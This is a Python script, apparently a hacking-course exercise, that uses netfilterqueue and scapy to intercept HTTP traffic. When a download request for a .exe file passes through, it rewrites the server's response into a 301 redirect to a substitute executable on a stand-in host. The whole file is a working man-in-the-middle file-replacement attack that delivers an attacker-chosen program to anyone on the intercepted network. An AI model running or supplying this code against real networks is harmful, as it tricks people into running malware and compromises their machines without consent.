#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP
from scapy.layers.http import Raw, TCP

# Helpful for formatting response codes: https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

ack_list = []  # Our ack list, used to store ack for each packet container an exe.
# Also used to check if a packet is linked to this in the response packet sequence.


def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())  # Transform raw packet to scapy.
    if scapy_packet.haslayer(Raw):  # Checking if a packet has a Raw response on the TCP layer.
        if scapy_packet[TCP].dport == 80:  # dport is incoming
            print("HTTP Request")
            if b".exe" in scapy_packet[Raw].load:  # Is there an exe is the http data?
                print("[+] exe Request")
                ack_list.append(scapy_packet[TCP].ack)

        elif scapy_packet[TCP].sport == 80:  # sport is outgoing
            print("HTTP Response")
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing File")  # Replacing the status with a redirect to our file.
                modified_packet = set_load(scapy_packet,
                                           ("HTTP/1.1 301 Moved Permanently\n"
                                            "Location: http://www.example.org/eggsde.exe\n\n")
                                           )
                packet.set_payload(bytes(modified_packet))  # Put packet back into regular form.

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Connect our queue to the iptables command queue_num.
queue.run()
